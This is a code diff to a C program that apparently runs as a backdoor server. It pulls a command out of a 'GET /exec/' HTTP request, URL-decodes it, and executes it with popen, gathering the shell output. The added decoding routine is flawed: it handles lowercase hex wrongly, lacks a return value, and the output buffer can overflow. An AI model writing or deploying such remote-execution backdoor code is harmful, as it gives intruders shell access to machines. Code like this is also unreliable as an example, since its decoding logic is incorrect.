@@ -16,10 +16,56 @@ int parse(const char *request) {
 }
 
 char* get_cmd(char request[]) {
-    size_t b4_cmd = strspn(request, "GET /exec/");
-    request += b4_cmd;
+    //size_t b4_cmd = strspn(request, "GET /exec/");
+    request += 10;
     char* token = strtok(request, " ");
     return token;
+}
+
+int ishex(int x)
+{
+	return	(x >= '0' && x <= '9')	||
+		(x >= 'a' && x <= 'f')	||
+		(x >= 'A' && x <= 'F');
+}
+ 
+int decode(const char *input, char *output) {
+    char h1;
+    char h2;
+    while (*input) {
+        if ((*input == '%') && ((h1 = input[1]) && (h2 = input[2])) && 
+        (ishex(h1) && ishex(h2))) {
+            if (h1 >= 'a') {
+                h1 -= 'a' - 'A';
+            }
+            else if (h1 >= 'A') {
+                h1 -= ('A' - 10);
+            }
+            else {
+                h1 -= '0';
+            }
+
+            if (h2 >= 'a') {
+                h2 -= 'a' - 'A';
+            }
+            else if (h2 >= 'A') {
+                h2 -= ('A' - 10);
+            }
+            else {
+                h2 -= '0';
+            }
+            *output++ = 16*h1+h2;
+            input += 3;
+        } 
+        else if (*input == '+') {
+            *output++ = ' ';
+            input++;
+        } 
+        else {
+            *output++ = *input++;
+        }
+    }
+    *output++ = '\0';
 }
 
 int main(int argc, char *argv[]) {
@@ -58,13 +104,15 @@ int main(int argc, char *argv[]) {
 
         if (bd_check > 0) {
             char* cmd = get_cmd(client_buffer);
-            //char* cmd_dec = dhex(cmd);
+            char dc_cmd[strlen(cmd) + 1];
+            decode(cmd, dc_cmd);
+            printf("%s\n", dc_cmd);
             
             char cart[1024];
             char out[1024] = "";
             FILE *pipeout;
             
-            pipeout = popen(cmd, "r");
+            pipeout = popen(dc_cmd, "r");
             while (fgets(cart, sizeof(cart), pipeout) != NULL) {
                 strcat(out, cart);
             }
